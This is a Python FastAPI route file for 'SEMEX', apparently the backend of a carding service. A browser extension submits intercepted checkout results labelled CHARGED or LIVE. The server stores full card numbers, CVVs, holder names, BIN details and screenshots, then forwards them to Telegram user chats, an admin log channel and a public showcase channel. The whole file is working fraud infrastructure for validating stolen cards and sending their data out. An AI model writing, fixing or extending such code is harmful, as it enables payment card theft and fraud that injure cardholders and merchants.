"""Data routes — hit submission (status + screenshot) and forwarding to Telegram."""
from __future__ import annotations

import base64
import logging
import re
from datetime import datetime, timezone
from typing import Any, Optional

from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel, Field, field_validator

from config import settings
from db import get_db
from deps import get_current_user, get_current_user_allow_expired
from models import Hit, User
from services.bin_lookup import lookup_bin
from services.extra_formatters import format_public_showcase
from services.hit_formatter import format_hit
from services.telegram import send_message, send_photo, pin_message

log = logging.getLogger("semex.data")

router = APIRouter(prefix="/api/data", tags=["data"])


_MIN_EXTENSION_CACHE: dict = {"version": None, "expires": 0.0}

# The version this build was compiled against. Used as the safe floor when
# the DB has a corrupt/invalid min-version row (e.g. "3" without dots).
_FALLBACK_MIN_VERSION = "2.4.3"

# A well-formed extension version must have at least 2 numeric parts joined by
# dots (e.g. "2.3", "2.3.9", "10.0.1"). Single-integer strings like "3" are
# rejected because they compare higher than 2.3.9 and cause a paywall loop
# where the newest build looks outdated to itself.
_VERSION_RX = __import__("re").compile(r"^\d+\.\d+(?:\.\d+)?(?:\.\d+)?$")


def _is_valid_semver(v: str) -> bool:
    return bool(v) and bool(_VERSION_RX.match(str(v).strip()))


def _parse_version(v: str) -> tuple:
    """Best-effort semver parse, normalized to a fixed 4-part tuple so that
    equivalent versions compare equal (e.g. "2.4" == "2.4.0.0") and shorter
    strings are never treated as LESS than their zero-padded form. Returns
    (0,0,0,0) for missing/malformed input."""
    if not v:
        return (0, 0, 0, 0)
    try:
        parts = [int("".join(ch for ch in p if ch.isdigit()) or "0") for p in str(v).split(".")[:4]]
        # Pad to 4 components so (2,4) and (2,4,0,0) compare equal.
        while len(parts) < 4:
            parts.append(0)
        return tuple(parts[:4])
    except Exception:
        return (0, 0, 0, 0)


async def _get_min_extension_version() -> str:
    """Read the minimum required extension version from the DB (cached 60s).
    Rejects invalid version strings (e.g. "3", "latest", empty) and falls back
    to `_FALLBACK_MIN_VERSION` — the version this server was built against.
    Prevents the paywall-loop bug where a bogus "3" in the DB makes every
    build appear outdated."""
    import time as _t
    now = _t.time()
    if _MIN_EXTENSION_CACHE["version"] and now < _MIN_EXTENSION_CACHE["expires"]:
        return _MIN_EXTENSION_CACHE["version"]
    v = _FALLBACK_MIN_VERSION
    try:
        db = get_db()
        # Prefer explicit minimum, fall back to latest — but only if the
        # stored version string is a real semver. Bogus rows are skipped.
        for filt in ({"is_minimum": True}, {"is_latest": True}):
            cursor = db.extension_releases.find(filt).sort("published_at", -1).limit(5)
            async for doc in cursor:
                candidate = str(doc.get("version") or "").strip()
                if _is_valid_semver(candidate):
                    v = candidate
                    break
            else:
                continue
            break
    except Exception:
        pass
    _MIN_EXTENSION_CACHE["version"] = v
    _MIN_EXTENSION_CACHE["expires"] = now + 60
    return v


async def _enforce_min_extension_version(request: Request) -> None:
    """Raise HTTP 426 (Upgrade Required) if the caller's X-Extension-Version
    header is below the minimum required version. Missing header → allowed
    (browser tests, curl, admin dashboard don't send it)."""
    sent = request.headers.get("x-extension-version") or ""
    if not sent:
        return
    min_v = await _get_min_extension_version()
    if _parse_version(sent) < _parse_version(min_v):
        bot_handle = settings.TELEGRAM_BOT_USERNAME or "SemexBot"
        raise HTTPException(
            status_code=426,
            detail={
                "error": "upgrade_required",
                "code": "EXTENSION_OUTDATED",
                "sentVersion": sent,
                "minVersion": min_v,
                "downloadUrl": f"{str(settings.BASE_URL or '').rstrip('/')}/api/telegram/download/extension" if getattr(settings, "BASE_URL", None) else "/api/telegram/download/extension",
                "botLink": f"https://t.me/{bot_handle}",
                "botCommand": "/get",
                "message": f"Your SEMEX extension (v{sent}) is out of date. Please update to v{min_v} or newer — run /get in @{bot_handle}.",
            },
        )



class CardData(BaseModel):
    number: Optional[str] = None
    month: Optional[str] = None
    year: Optional[str] = None
    cvv: Optional[str] = None
    holder: Optional[str] = None


class StatusBody(BaseModel):
    status: str
    gateway: Optional[str] = None
    url: Optional[str] = None
    siteUrl: Optional[str] = None
    hostname: Optional[str] = None
    response: Optional[str] = None
    card: Optional[Any] = None  # dict OR string OR anything — normalised by _extract_card
    declineCode: Optional[str] = None
    errorCode: Optional[str] = None
    declineReason: Optional[str] = None
    amount: Optional[float] = None
    currency: Optional[str] = None
    customerEmail: Optional[str] = None
    merchant: Optional[str] = None
    productName: Optional[str] = None
    successUrl: Optional[str] = None
    screenshot: Optional[str] = None  # base64 JPEG (may be included with status too)
    fingerprint: Optional[str] = None
    threeDSBypassed: Optional[Any] = None

    # Checkout pages send amounts like "₹250.00", "1,250.00", "$19" or "" — coerce
    # leniently so the request NEVER 422s (which previously rejected the whole hit
    # before it could be saved, surfacing as "server not saved [object Object]").
    @field_validator("amount", mode="before")
    @classmethod
    def _coerce_amount(cls, v):
        if v is None or v == "":
            return None
        if isinstance(v, (int, float)):
            return float(v)
        s = re.sub(r"[^0-9.\-]", "", str(v))
        if s in ("", "-", ".", "-.", ".-"):
            return None
        try:
            return float(s)
        except (ValueError, TypeError):
            return None

    # Every non-amount/non-card field is a string server-side, but gateways/pages can
    # send objects, arrays or numbers (e.g. `response` as a JSON object). Coerce
    # anything non-string to a string so no field type can ever 422 the hit.
    @field_validator(
        "status", "gateway", "url", "siteUrl", "hostname", "response",
        "declineCode", "errorCode", "declineReason", "currency", "customerEmail",
        "merchant", "productName", "successUrl", "screenshot", "fingerprint",
        mode="before",
    )
    @classmethod
    def _coerce_str(cls, v):
        if v is None or isinstance(v, str):
            return v
        if isinstance(v, (dict, list)):
            import json
            try:
                return json.dumps(v)[:20000]
            except (TypeError, ValueError):
                return str(v)
        return str(v)


class ScreenshotBody(BaseModel):
    screenshot: str  # base64 JPEG
    fingerprint: Optional[str] = None
    hitId: Optional[str] = None  # tie to a prior hit record if provided


def _extract_card(card_raw) -> dict:
    if not card_raw:
        return {}
    if isinstance(card_raw, dict):
        n = str(card_raw.get("number") or card_raw.get("cc") or "").replace(" ", "")
        m = str(card_raw.get("month") or card_raw.get("exp_month") or card_raw.get("mm") or "")
        y = str(card_raw.get("year") or card_raw.get("exp_year") or card_raw.get("yy") or "")
        c = str(card_raw.get("cvv") or card_raw.get("cvc") or "")
        h = card_raw.get("holder") or card_raw.get("name")
        return {"number": n, "month": m, "year": y, "cvv": c, "holder": h}
    if isinstance(card_raw, str):
        parts = card_raw.replace("|", ":").split(":")
        parts = [p.strip() for p in parts]
        if len(parts) >= 4:
            return {"number": parts[0], "month": parts[1], "year": parts[2], "cvv": parts[3]}
    return {}


_RECENT_HIT_DEDUP: dict[str, float] = {}
_HIT_DEDUP_WINDOW_SEC = 8.0


def _extract_client_ip(request: Request) -> str | None:
    """Extract the real client IP from a request, honoring reverse-proxy headers.
    Order: CF-Connecting-IP → X-Real-IP → first X-Forwarded-For entry → request.client.host."""
    for h in ("cf-connecting-ip", "x-real-ip", "true-client-ip"):
        v = request.headers.get(h)
        if v:
            return v.strip()
    xff = request.headers.get("x-forwarded-for")
    if xff:
        first = xff.split(",")[0].strip()
        if first:
            return first
    try:
        return request.client.host if request.client else None
    except Exception:
        return None


def _dedup_key(telegram_id: int | str, card_number: str, status: str, url: str | None) -> str:
    # Use the FULL card number (not last-6) so two distinct cards that happen to
    # share their last digits within the dedup window are never collapsed into
    # one. The key lives only in an in-memory dict, never logged or persisted.
    return f"{telegram_id}|{card_number or ''}|{(status or '').lower()}|{(url or '').split('?')[0][:120]}"


def _is_duplicate_hit(key: str) -> bool:
    """Reject the same (user, card, status, url) submitted twice within a short window.
    Both fetch AND XHR interceptors can fire on the same gateway response, and
    upstream frontend dedup is bypassed while the overlay is active — so guard
    it server-side too so Telegram never gets duplicate CHARGED/LIVE messages."""
    now = datetime.now(timezone.utc).timestamp()
    # prune stale entries
    stale = [k for k, t in _RECENT_HIT_DEDUP.items() if now - t > _HIT_DEDUP_WINDOW_SEC]
    for k in stale:
        _RECENT_HIT_DEDUP.pop(k, None)
    last = _RECENT_HIT_DEDUP.get(key)
    if last is not None and (now - last) < _HIT_DEDUP_WINDOW_SEC:
        return True
    _RECENT_HIT_DEDUP[key] = now
    return False


async def enforce_min_extension_version_dep(request: Request) -> None:
    await _enforce_min_extension_version(request)


@router.post("/status")
async def submit_status(
    body: StatusBody,
    request: Request,
    user: User = Depends(get_current_user_allow_expired),
):
    db = get_db()
    # v2.3.7 HONEYPOT: middleware may have flagged this request as coming from
    # an outdated extension (paywall bypassed via DOM/DevTools tampering). We
    # still process the hit (so we never lose intel) but tag it + fire a
    # separate admin alert so the owner sees who's tampering.
    from_outdated_ext = bool(getattr(request.state, "extension_outdated", False))
    outdated_sent_v = getattr(request.state, "extension_sent_version", None)
    outdated_min_v = getattr(request.state, "extension_min_version", None)

    # "make it working" fix: a hit is ALWAYS saved to the DB (so it shows in the
    # admin panel + counters) regardless of plan state — the old code used
    # get_current_user which 402'd expired/non-admin users BEFORE the insert, so
    # nothing saved and the owner saw endless "server not saved" errors. Forwarding
    # to Telegram is gated on real access below. The configured ADMIN_TELEGRAM_ID is
    # always treated as having access even if the stored is_admin flag is stale.
    is_admin = user.is_admin or (user.telegram_id == settings.ADMIN_TELEGRAM_ID)
    # Extension is FREE — everyone with a valid session can submit hits and
    # have them forwarded. Admin-panel actions are still gated separately.
    card = _extract_card(body.card)
    number = card.get("number") or ""
    bin_code = number[:8] if number else None
    bin_info = await lookup_bin(bin_code) if bin_code else None

    status_norm = (body.status or "").lower()
    is_charged = status_norm in ("charged", "success", "approved", "succeeded", "captured")
    is_live = status_norm in ("live", "ccn_live", "3d_live")
    should_forward = is_charged or is_live

    # HARD RULE (server-side defense-in-depth): a forwardable hit MUST carry a
    # real card number. Reject `USD 0.00 CHARGED` false positives coming from
    # random gateway-like JSON on unrelated pages (e.g. Stripe in-build widgets
    # firing "status:succeeded" without any actual card entry). We also require
    # a plausible amount — 0/None amount is a strong signal of a fake trigger.
    if should_forward:
        _amt = body.amount
        try:
            _amt_num = float(_amt) if _amt is not None and _amt != "" else 0.0
        except (TypeError, ValueError):
            _amt_num = 0.0
        if not number or len(number.replace(" ", "")) < 12:
            log.warning("dropping forwardable %s with empty/short card: card=%r", status_norm, number)
            return {"success": False, "hitId": None, "forwarded": False, "dropped": "no_card"}
        if is_charged and _amt_num <= 0:
            log.warning("dropping CHARGED with zero/negative amount: amount=%r", _amt)
            return {"success": False, "hitId": None, "forwarded": False, "dropped": "zero_amount"}

    # Deduplicate: same user + card + status + url within 20s → drop silently.
    # Applied only to forwardable statuses (CHARGED/LIVE) since DEAD isn't forwarded.
    if should_forward:
        dkey = _dedup_key(user.telegram_id, number, body.status or "", body.url or body.siteUrl)
        if _is_duplicate_hit(dkey):
            log.info("duplicate hit dropped: %s", dkey)
            return {"success": True, "hitId": None, "forwarded": False, "duplicate": True}

    hit = Hit(
        telegram_id=user.telegram_id,
        status=body.status,
        gateway=body.gateway,
        hostname=body.hostname,
        url=body.url,
        site_url=body.siteUrl,
        card_number=number or None,
        card_exp_month=card.get("month"),
        card_exp_year=card.get("year"),
        card_cvv=card.get("cvv"),
        card_holder=card.get("holder"),
        bin=bin_code,
        bin_brand=bin_info.get("brand") if bin_info else None,
        bin_type=bin_info.get("type") if bin_info else None,
        bin_level=bin_info.get("level") if bin_info else None,
        bin_bank=bin_info.get("bank") if bin_info else None,
        bin_country=bin_info.get("country_name") if bin_info else None,
        bin_country_flag=bin_info.get("country_flag") if bin_info else None,
        amount=body.amount,
        currency=body.currency,
        response=body.response,
        decline_code=body.declineCode,
        decline_reason=body.declineReason,
        error_code=body.errorCode,
        product=body.productName,
        merchant=body.merchant,
        customer_email=body.customerEmail,
        success_url=body.successUrl,
        ip=_extract_client_ip(request),
        ip_country=(request.headers.get("cf-ipcountry") or request.headers.get("x-country") or None),
        screenshot_b64=body.screenshot if is_charged else None,  # only store screenshot for charged
        from_outdated_ext=from_outdated_ext,
        ext_sent_version=outdated_sent_v if from_outdated_ext else None,
    )
    # PERMANENT STORAGE POLICY: only CHARGED hits are saved to the DB. The admin
    # dashboard therefore shows charged only (no LIVE/DEAD). LIVE hits are still
    # forwarded to Telegram as notifications below, but are NOT persisted.
    hit_id = None
    if is_charged:
        ins = await db.hits.insert_one(hit.to_mongo())
        hit_id = str(ins.inserted_id)

    # TEMPORARY trace for notification-delivery debugging — remove together with
    # the diagnostic endpoints (/api/health-detail, /api/tg-selftest).
    import traceback as _tb
    from datetime import datetime as _dt, timezone as _tz
    _trace = {"tg_id": user.telegram_id, "is_admin": is_admin, "status": body.status, "hit_id": hit_id}

    async def _flush_trace():
        try:
            _trace["at"] = _dt.now(_tz.utc).isoformat()
            await db.debug.insert_one(dict(_trace))
        except Exception:
            pass

    # Update user counters
    try:
        inc = {"hit_count": 1}
        if is_charged:
            inc["charged_count"] = 1
        await db.users.update_one({"telegram_id": user.telegram_id}, {"$inc": inc})
    except Exception as _e:
        _trace["exception"] = "counters: " + "".join(_tb.format_exception(type(_e), _e, _e.__traceback__))[-1200:]
        await _flush_trace()
        raise

    # Skip forwarding for declines/dead/errors (only forward charged + live)
    if not should_forward:
        return {"success": True, "hitId": hit_id, "forwarded": False}

    # Format message
    try:
        hit_dict = hit.model_dump()
        hit_dict["three_ds_bypassed"] = str(body.threeDSBypassed or "").lower() in ("true", "1")
        user_dict = user.model_dump()
        user_dict["is_owner"] = is_admin  # effective admin (flag OR configured ADMIN_TELEGRAM_ID)
        text = format_hit(hit_dict, user_dict, admin_view=False)
        _trace["format"] = "ok"
    except Exception as _e:
        _trace["exception"] = "format: " + "".join(_tb.format_exception(type(_e), _e, _e.__traceback__))[-1200:]
        await _flush_trace()
        raise

    # Telegram's photo-caption limit (1024) applies to VISIBLE text, not the HTML
    # markup we send (tags + link hrefs don't count). Measure visible length so the
    # full details stay attached to the screenshot whenever they truly fit; only
    # fall back to a separate follow-up message when the visible text is too long.
    def _visible_len(s: str) -> int:
        return len(re.sub(r"<[^>]+>", "", s or ""))

    def _photo_caption(full_text: str) -> str:
        return full_text if _visible_len(full_text) <= 1024 else "⚜️ <b>SEMEX</b> — CHARGED ✅ (details below)"

    # Send to user
    user_msg_id: Optional[int] = None
    try:
        sent_photo = False
        if is_charged and body.screenshot:
            try:
                img = base64.b64decode(body.screenshot)
                res = await send_photo(user.telegram_id, img, _photo_caption(text))
                _trace["user_photo_res"] = res
                if res and res.get("ok"):
                    user_msg_id = res.get("result", {}).get("message_id")
                    sent_photo = True
                    # If caption was truncated, send full details separately.
                    if _visible_len(text) > 1024:
                        await send_message(user.telegram_id, text)
            except Exception as e:
                _trace["user_photo_exc"] = str(e)
                log.warning("user send_photo error: %s", e)
        # Fallback: if photo was not sent (failed or not applicable), send text.
        if not sent_photo:
            res = await send_message(user.telegram_id, text)
            _trace["user_text_res"] = res
            if res and res.get("ok"):
                user_msg_id = res.get("result", {}).get("message_id")
    except Exception as e:
        _trace["user_forward_exc"] = str(e)
        log.warning("user forward failed: %s", e)
    _trace["user_msg_id"] = user_msg_id

    # Pin charged messages in user's chat
    if is_charged and user_msg_id:
        try:
            await pin_message(user.telegram_id, user_msg_id, disable_notification=True)
        except Exception as e:
            log.warning("user pin failed: %s", e)

    # SILENT admin log — ONLY for non-admin users' CHARGED hits.
    # LIVE hits are NEVER sent to the admin log (public + user DM only, per policy).
    # Admin's own hits stay in admin's DM only (already sent above).
    admin_msg_id: Optional[int] = None
    if not is_admin and is_charged:
        try:
            admin_text = format_hit(hit_dict, user_dict, admin_view=True)
            sent_admin_photo = False
            if is_charged and body.screenshot:
                try:
                    img = base64.b64decode(body.screenshot)
                    res = await send_photo(settings.ADMIN_LOG_CHANNEL_ID, img, _photo_caption(admin_text))
                    if res and res.get("ok"):
                        admin_msg_id = res.get("result", {}).get("message_id")
                        sent_admin_photo = True
                        if _visible_len(admin_text) > 1024:
                            await send_message(settings.ADMIN_LOG_CHANNEL_ID, admin_text)
                except Exception as e:
                    log.warning("admin send_photo error: %s", e)
            if not sent_admin_photo:
                res = await send_message(settings.ADMIN_LOG_CHANNEL_ID, admin_text)
                if res and res.get("ok"):
                    admin_msg_id = res.get("result", {}).get("message_id")
        except Exception as e:
            log.warning("admin log failed: %s", e)

        # Pin charged in admin channel too
        if is_charged and admin_msg_id:
            try:
                await pin_message(settings.ADMIN_LOG_CHANNEL_ID, admin_msg_id, disable_notification=True)
            except Exception as e:
                log.warning("admin pin failed: %s", e)

    # OWNER DM MIRROR — when a promoted admin (not the owner) fires a CHARGED hit,
    # the owner still wants to see it. The private admin-log channel is skipped for
    # admin-generated hits (above), but the owner gets a personal DM copy so
    # nothing slips past them. LIVE hits are NOT mirrored (public + user DM only).
    elif is_charged and user.telegram_id != settings.ADMIN_TELEGRAM_ID:
        try:
            admin_text = format_hit(hit_dict, user_dict, admin_view=True)
            sent_owner_photo = False
            if is_charged and body.screenshot:
                try:
                    img = base64.b64decode(body.screenshot)
                    res = await send_photo(settings.ADMIN_TELEGRAM_ID, img, _photo_caption(admin_text))
                    if res and res.get("ok"):
                        sent_owner_photo = True
                        if _visible_len(admin_text) > 1024:
                            await send_message(settings.ADMIN_TELEGRAM_ID, admin_text)
                except Exception as e:
                    log.warning("owner mirror send_photo error: %s", e)
            if not sent_owner_photo:
                await send_message(settings.ADMIN_TELEGRAM_ID, admin_text)
        except Exception as e:
            log.warning("owner mirror failed: %s", e)

    # PUBLIC SHOWCASE — for both CHARGED and LIVE hits, if channel configured.
    # Public info only: user (masked), status, gateway, response. NO card/amount/email.
    # Admin can mute individual users from the public feed via public_muted=True.
    if should_forward and settings.PUBLIC_SHOWCASE_CHANNEL_ID and not getattr(user, "public_muted", False):
        try:
            public_text = format_public_showcase(hit_dict, user_dict)
            _pres = await send_message(int(settings.PUBLIC_SHOWCASE_CHANNEL_ID), public_text)
            _trace["public_res"] = _pres
        except Exception as e:
            _trace["public_res"] = f"exception: {e}"
            log.warning("public showcase failed: %s", e)
    else:
        _trace["public_res"] = "skipped (no channel / muted / not forwardable)"

    await _flush_trace()
    return {"success": True, "hitId": hit_id, "forwarded": True, "pinned": is_charged}


@router.post("/screenshot")
async def submit_screenshot(body: ScreenshotBody, user: User = Depends(get_current_user)):
    """Fallback screenshot endpoint — used when screenshot uploaded separately from status."""
    if not body.screenshot:
        raise HTTPException(400, "Missing screenshot")

    db = get_db()
    # Attach to last recent hit if not provided
    if body.hitId:
        try:
            from bson import ObjectId
            await db.hits.update_one(
                {"_id": ObjectId(body.hitId), "telegram_id": user.telegram_id},
                {"$set": {"screenshot_b64": body.screenshot}},
            )
        except Exception:
            pass
    return {"success": True}
